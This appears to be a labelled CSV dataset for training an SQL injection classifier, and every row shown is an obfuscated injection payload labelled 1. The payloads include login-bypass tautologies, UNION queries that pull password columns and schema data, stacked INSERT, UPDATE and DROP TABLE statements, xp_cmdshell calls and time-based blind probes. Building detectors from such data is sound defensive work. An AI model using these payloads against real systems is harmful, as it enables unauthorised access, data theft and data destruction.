Sentence,Label
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518231 AND 1=1649--",1
' UNION SELECT NULL--/*622/*--,1
useradmin' OR 1=1------,1
"admin' UNION SELECT NULL,NULL--897514",1
' OR '1'='1' --/* AND 1=1793#,1
'/**/OR/**/'1'='1'/**/--/*75#,1
1'----101--/*,1
admin0x27/*46746835,1
admin'%20OR%20'1'='1 AND 1=1987 OR 1=1,1
%2527%2520or%25201%253D1/%252A523138,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236--",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353#612",1
admin0x27/*467468 OR 1=1708142,1
admin'%20OR%20'1'='1 AND 1=1987656,1
"""%20or%201=1#428/*",1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#--252696",1
user' UNION SELECT NULL-- AND 1=14863292,1
11' OR 1 = 1/*--,1
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#804192730,1
10x27; WAITFOR DELAY 0x2700:00:050x27----,1
')/**/OR/**/1=1--#,1
'/**/OR/**/'1'='1'/**/--/*,1
1'%20OR%20'1'%20=%20'1918,1
admin1' OR '1' = '1--/*603#937149995,1
"test"" UNION SELECT username,password FROM users-- AND 1=1364",1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408298--",1
'%20or%201=1# AND 1=1368,1
ADMIN'/*--672--638,1
aDMin'/*778,1
"testadmin"" OR ""1""=""1 AND 1=1613----#",1
"""%20or%201=1/*835257/* OR 1=1 AND 1=1",1
"ADMIN""/*172531363",1
'%20or%201=1# AND 1=1--/*,1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309462/*,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1",1
admin'%20OR%20'1'='1 AND 1=1987656414589450,1
"""/**/OR/**/1=1-- OR 1=1876--/*--417632",1
"admin"" OR ""1""=""1"" /* AND 1=1452900178",1
' OR '1'='1' --/* AND 1=1793# OR 1=1421,1
"' union select null,null,null--# AND 1=1--491 OR 1=1102",1
"""+UNION+SELECT+NULL--608861 AND 1=1210",1
""" OR ""1""=""1#474#30",1
test' OR '1'='1-- OR 1=1733922,1
' or 2=2--/*,1
' OR '2'='213/*# OR 1=1822,1
2' OR 2 = 2--#955583,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927#",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1696",1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1 AND 1=1",1
11' OR 1 = 1/*--751,1
1'%09AND%09pg_sleep(5)--860 OR 1=1258190421,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679",1
'%20or%201=1/*83525738383394,1
' or 2=2/* AND 1=1/*,1
"user"") OR (""1""=""128 AND 1=1",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435854,1
user' OR 1=1/*/* AND 1=1--,1
""" OR 1=1#----# AND 1=1-- AND 1=1",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784173",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*",1
"test"" UNION SELECT NULL,NULL--/* AND 1=1",1
admin') OR 1=1--# AND 1=1580272--/*,1
user' OR '1'='1#315-- AND 1=1/*619,1
'%20or%201=1/*835257/* OR 1=1/*250,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=184",1
1' OR 'a'='a544#80 AND 1=1,1
"'/**/UNION/**/SELECT/**/NULL,NULL,NULL--306--",1
'; ExeC XP_cmdSheLl('Dir')----/*,1
'+OR+1=1#/*# AND 1=1/* AND 1=1,1
') OR ('1'='1/*--384,1
1' UNION SELECT NULL----159676,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1524,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614,1
"user"" OR 1=1/*/* AND 1=1/*/*",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928,1
user' UNION SELECT NULL-- AND 1=14,1
"admin"") OR (""1""=""1# OR 1=1/*",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868/* AND 1=1,1
"' union select null,null,null--# AND 1=1--682 OR 1=1481",1
"test' UNION SELECT 1,2,3-- AND 1=1512794",1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1380,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784425",1
' OR '2'='2 AND 1=1 AND 1=1--173----,1
"testadmin"" OR 1=1-- AND 1=1126868",1
' or 2=2----,1
"1"" UNION SELECT NULL,NULL,NULL--149 OR 1=1 OR 1=1494819",1
useradmin' OR 1=1--#/*606,1
""" OR ""1""=""1"" /*##256176",1
admin'%20OR%20'1'='1 AND 1=1987656414,1
test' OR '1'='1' --714132408,1
""")+OR+(""1""=""1 AND 1=1875#",1
1'%20OR%201%20=%201575409713--,1
'%09OR%091=1--#,1
admin'/**/OR/**/1=1-- OR 1=1402283,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')--517",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889608",1
"""%20or%201=1/*835 OR 1=1 OR 1=1",1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481477",1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982781/*",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--",1
admin' OR 1=1#177633,1
user' OR 1=1/*/* AND 1=1/*/*#,1
') OR ('1'='1/* OR 1=1293,1
"""%20AND%20extractvalue(1,concat(0x7e,version()))----",1
admin' OR 1=1/*#104#,1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 AND 1=1#--",1
1' OR '1'='1' --#412640705,1
test' UNION SELECT NULL----#779625,1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353#253",1
"test"" UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1515",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878##",1
' OR 1=1#----# AND 1=1--# AND 1=1378962,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377",1
1'%20AND%20pg_sleep(5)--533872287,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236----",1
"admin' UNION SELECT 1,2,3--#343451--536263",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=166556590",1
' OR 'a'='a839826,1
1' OR '1'='1 OR 1=1 AND 1=1,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1666",1
"admin' UNION SELECT username,password FROM users-- AND 1=1/*",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631/*/*",1
1' OR '1'='1' --/*#,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889141",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1",1
admin0x27/*58763508,1
"1"" UNION SELECT NULL,NULL------611--/*821",1
1'%20AND%20pg_sleep(5)--533553 OR 1=1 OR 1=1,1
admin') OR 1=1--# AND 1=1580272--,1
"user"" UNION SELECT NULL--/*58370 AND 1=1 AND 1=1975/*",1
' or 2=2--,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*788",1
"admin' UNION SELECT 1,2,3--#343451--536729",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87117,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1",1
"""%20or%201=1/*",1
ADMIN'/*172620849,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--247,1
"test1"" OR ""1"" = ""1/*# AND 1=1--631/*/*800",1
admin' OR 1=1#177,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282 AND 1=1",1
1'%20OR%201%20=%201575409,1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710 OR 1=1--124,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*788318",1
1' OR 1=1#-- AND 1=1603,1
admin0x27/*58763,1
"1' UNION SELECT username,password FROM users--652576--",1
"admin"" OR 1=1-- OR 1=1 AND 1=1 AND 1=1",1
ADMIN'/* AND 1=1911 AND 1=110,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*660",1
"user"" UNION SELECT NULL--/*58370 AND 1=1 AND 1=1975",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198650601",1
1' OR 'a'='a544/*606,1
'%20or%201=1#/*#,1
""" OR 1=1/*--929888",1
' UNION SELECT NULL--/*,1
'/**/OR/**/'1'='1'/**//*589 OR 1=1 AND 1=1,1
user' OR '1'='1#315-- AND 1=1 OR 1=1,1
') OR ('1'='1/* OR 1=1--/* AND 1=1,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#47",1
' OR 'a'='a8398922,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851 AND 1=1",1
user' OR 'a'='a----,1
"1' UNION SELECT 1,2,3-- AND 1=1952 AND 1=1136/*",1
"""+OR+1=1----966",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1",1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518231 AND 1=1",1
"1"" UNION SELECT NULL----159334593107 AND 1=1",1
1%27%20OR%20%271%27%20%3D%20%271/*403,1
'/**/OR/**/1=1-- OR 1=1 OR 1=1#,1
"""/**/OR/**/1=1-- OR 1=1373 AND 1=1",1
admin1' OR '1' = '1--/*603#937272,1
admin'%20OR%20'1'='1 AND 1=1919112,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=1853657",1
useradmin' OR 1=1----,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131496 AND 1=1",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1515/*",1
' OR '2'='213/*# OR 1=1,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423",1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--",1
'%20or%201=1--969 OR 1=1/*215 OR 1=1,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489383#",1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1",1
""" OR ""1""=""1--322852661--",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/*/*554",1
2' OR '2' = '2163254#,1
') OR ('1'='1/* OR 1=1--326 AND 1=1250--,1
"99"" OR 99 = 99 OR 1=1#/*307",1
' OR 99=99# OR 1=1,1
"admin' UNION SELECT NULL,NULL--#122",1
"""%20or%201=1-- OR 1=1",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1889141 OR 1=1",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428/*",1
' OR '2'='2 OR 1=1702,1
""" OR 1=1/*--92988891",1
"1"" UNION SELECT NULL----395/* AND 1=1228931",1
""" AND extractvalue(1,concat(0x7e,version()))--161/*788318512",1
' OR 1=1#-- OR 1=1#810437,1
"""+UNION+SELECT+NULL--608861 AND 1=1",1
2' OR '2' = '2163254#820,1
'; update users set password='hacked'-- AND 1=1,1
admin'%20OR%20'1'='1 AND 1=1919,1
' or 2=2/*# OR 1=1,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739####",1
1'%20AND%20pg_sleep(5)--533872437458988,1
' UNION SELECT NULL--/*622/*42723926,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")----",1
admin' OR '1'='1946#540,1
test' OR '1'='1 AND 1=1--600,1
' OR '1'='1#474,1
"admin"" UNION ALL SELECT NULL--24127474161",1
%2527%2529%2520OR%2520%2528%25271%2527%253D%25271--# OR 1=1,1
"""; UPDATE USERS SET PASSWORD=""HACKED""--69164 OR 1=1#",1
"admin1"" OR ""1"" = ""1# AND 1=1#785489920",1
admin'/*451446,1
' OR 'a'='a83989127,1
ADMIN'/*172620849196533243,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977 AND 1=1",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679664",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708",1
1' OR '1'='1 OR 1=1257,1
' OR '2'='2/*785,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598669",1
' OR '2'='213/*# OR 1=1822 AND 1=1,1
1%27%3B%20DROP%20TABLE%20users--/*277,1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887639/*,1
ADMIN'/* AND 1=1911 AND 1=110515875,1
2' OR '2' = '2163254#784,1
test1' OR 1 = 1# OR 1=1516,1
admin' UNION ALL SELECT NULL--24127#,1
'%20or%201=1# OR 1=1,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=143585497703,1
'+OR+1=1--156/*437902,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1,1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1665",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#871,1
' OR 1=1#-- OR 1=1,1
2' OR 2 = 2--#955583943,1
"ADMIN""/*172247/*309",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728146,1
' OR 'a'='a839,1
"test' UNION SELECT username,password FROM users--/*#/*#",1
"admin' UNION SELECT 1,2,3--#343451--536",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892--",1
%2527%2520OR%25201%253D1/%252A--,1
admin') OR 1=1--# AND 1=1580,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*#--",1
'%20or%201=1# AND 1=1368--,1
2' AND SLEEP(5)--76181697,1
""" OR 1=1/*--929888175#",1
"""/**/OR/**/1=1-- OR 1=1876--/*--417657",1
"ADMIN""/*172871638661",1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1,1
admin' UNION ALL SELECT NULL-- AND 1=1,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--913",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258--,1
"2"" OR ""2"" = ""2163254#/*97",1
' OR '1'='1#474#,1
"1'; INSERT INTO users VALUES('hacked','pass')--739# AND 1=1651",1
1' UNION SELECT NULL----395,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##48-- AND 1=1,1
'/**/OR/**/'1'='1'/**/-- OR 1=1575518,1
'+OR+1=1#/*# AND 1=1/*#/*,1
useradmin' OR 1=1--#/*60666,1
"""/**/OR/**/1=1-- OR 1=1876--/*--417",1
"admin"" OR ""1""=""1"" /* AND 1=1452900178843",1
"1';%09INSERT%09INTO%09users%09VALUES('hacked','pass')--319",1
test' OR '1'='1 AND 1=1--,1
admin1' OR '1' = '1--/*603#93727295,1
%2527%2520or%25201%253D1/%252A523,1
admin'/**/OR/**/1=1-- OR 1=1402,1
"useradmin"" OR ""1""=""1-- OR 1=1125737948",1
"admin' UNION SELECT 1,2,3----811-- OR 1=1--282",1
"1'/**/UNION/**/SELECT/**/NULL,table_name/**/FROM/**/information_schema.tables--",1
""" OR 99=99##77",1
"""%20or%201=1# AND 1=1",1
""" OR 1=1#----## AND 1=1274140",1
1' OR '1'='1' --/* OR 1=1-- OR 1=1 AND 1=1 AND 1=1,1
"""/**/OR/**/1=1-- OR 1=1/*857470924140",1
' OR '2'='213973 AND 1=1,1
admin' UNION ALL SELECT NULL--24127,1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/* OR 1=1,1
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=1",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1",1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##504",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679#905",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----791 OR 1=1,1
"admin"" UNION SELECT 1,2,3-- AND 1=1957725194",1
1' OR '1'='1 OR 1=1257--570,1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*",1
1' OR '1'='1 OR 1=1257974,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*,1
"testadmin"" OR ""1""=""1 AND 1=1613186499",1
user' OR 1=1--/* OR 1=178/*,1
"""/**/OR/**/1=1-- OR 1=1876--/*--417667",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1",1
"user"") OR 1=1-- AND 1=1/* OR 1=1",1
1' OR '1'='1' --#57 OR 1=1901 OR 1=1,1
2' OR '2' = '2163254619,1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184 AND 1=1,1
' UNION SELECT NULL--/*622/*427/*25640,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1379",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1/*",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----,1
"'%20UNION%20SELECT%20NULL,NULL,NULL--511138/*81",1
1'%20OR%201%20=%201575409713,1
"user"" OR ""1""=""1#-- OR 1=1 OR 1=1",1
""" OR 99=99##",1
"99"" OR 99 = 99 OR 1=1#/*5",1
"user"" UNION SELECT 1,2,3-- AND 1=1749",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302909",1
'%20or%201=1--969 OR 1=1/*215 OR 1=1398,1
"useradmin"" OR ""1""=""1-- OR 1=1125",1
admin' UNION ALL SELECT NULL--24127474161,1
' OR '2'='213/*36,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=143585497,1
"""%20or%201=1# AND 1=1 OR 1=1447",1
' OR '1'='1#474225,1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353# OR 1=1--",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/*670",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*-- AND 1=1 AND 1=1",1
test' OR 1=1## AND 1=1/*,1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1,1
"user"") OR (""1""=""1 AND 1=1626 AND 1=1548",1
admin'%20OR%20'1'='1,1
"test"") OR 1=1--/* OR 1=1",1
' OR '2'='213973 AND 1=1--53--,1
'/**/OR/**/'1'='1'/**/--/*75#591 AND 1=1,1
1'%09AND%09pg_sleep(5)--860 OR 1=125816#,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*",1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--813968#",1
' OR 'a'='a83989,1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1#,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236 OR 1=1",1
"user' UNION SELECT 1,2,3-- AND 1=1223",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--600",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168/*",1
"""%09or%091=1# AND 1=1 OR 1=1691449626985",1
""" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1592",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497352",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561",1
"admin"" UNION ALL SELECT NULL--24127474161461",1
1' OR '1'='1 OR 1=1257--57050,1
' OR '1'='1 AND 1=1 OR 1=1----,1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--828525",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1#75 AND 1=1",1
'+or+1=1# OR 1=1 AND 1=1 OR 1=1--,1
user' OR '1'='1' -- AND 1=1/*--,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1515447",1
"user"") OR 1=1-- AND 1=1882350307# OR 1=1",1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#87151,1
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1 AND 1=1",1
1'%20OR%201%20=%201575409713838,1
"test"" OR 1=1##933993",1
1' OR '1'='1 OR 1=1257--57050396,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1,1
"' union select null,null,null--##",1
""" OR ""2""=""213 AND 1=1567 AND 1=1",1
';%20EXEC%20xp_cmdshell('dir')--#/*,1
"1""+OR+1+=+1351888",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773618694",1
"""%09UNION%09SELECT%091,2,3--",1
admin%2527--215,1
1' UNION SELECT NULL----395583,1
"""%20or%201=1-- OR 1=1--",1
0x27 UNION ALL SELECT NULL--415482/*# AND 1=1,1
admin0x27/* OR 1=1 AND 1=1955608,1
"admin"" UNION SELECT NULL,NULL--181885 AND 1=1",1
'%20or%201=1/*83525738383159988,1
admin'%20OR%20'1'='1 AND 1=1987656414589,1
ADMIN'/* AND 1=1911 AND 1=110515,1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889 OR 1=1--",1
"test"" UNION ALL SELECT NULL-- OR 1=129",1
"test' UNION SELECT 1,2,3--/*10 AND 1=1# AND 1=1",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1,1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1,1
1' OR '1'='1 OR 1=1257--57084,1
admin0x27/* OR 1=1 AND 1=1298,1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982781/*#",1
"1""+OR+1+=+1351888568",1
') OR ('1'='1/* OR 1=1--326 AND 1=1,1
test1' OR '1' = '1/*#63257751,1
admin' OR 1=1/*##487 OR 1=1,1
"ADMIN""/*172871",1
' UNION SELECT NULL--/*622/*427/*256 OR 1=1 AND 1=1,1
"99"" OR 99 = 99 OR 1=1# OR 1=1",1
"test"" OR 1=1##933102#/*",1
""")+OR+(""1""=""1-- AND 1=1729",1
"admin"" OR 1=1--/* OR 1=1--",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1",1
"user"" UNION SELECT NULL--/*844",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428",1
'%09UNION%09ALL%09SELECT%09NULL--/*/*,1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721470",1
"admin"") OR (""1""=""1# OR 1=160194",1
admin1' OR '1' = '1--/*/*814--,1
' UNION SELECT NULL--/*622/*427/*25640567,1
"""%20or%201=1/*835/*#442",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##567,1
"useradmin"" OR 1=1--#",1
"10x27; INSERT INTO users VALUES(0x27hacked0x27,0x27pass0x27)--#",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594 OR 1=1112",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794 AND 1=134840",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/*--",1
user' OR 1=1/*/* AND 1=1--118,1
"admin1"" OR ""1"" = ""1# AND 1=1#78548992098",1
""" OR 1=1#----# AND 1=1-- AND 1=1876 AND 1=1#",1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256541312",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/*",1
2' AND SLEEP(5)----232,1
"' union select null,null,null--# AND 1=1--682 OR 1=1",1
"test"" UNION SELECT 1,2,3-- AND 1=1512 AND 1=1#793#",1
'%20or%201=1--969 OR 1=1/*309310,1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 AND 1=1695,1
"1""%20AND%20pg_sleep(5)--533872287 OR 1=1124",1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=18432",1
' UNION SELECT NULL--/*622/*427/*256,1
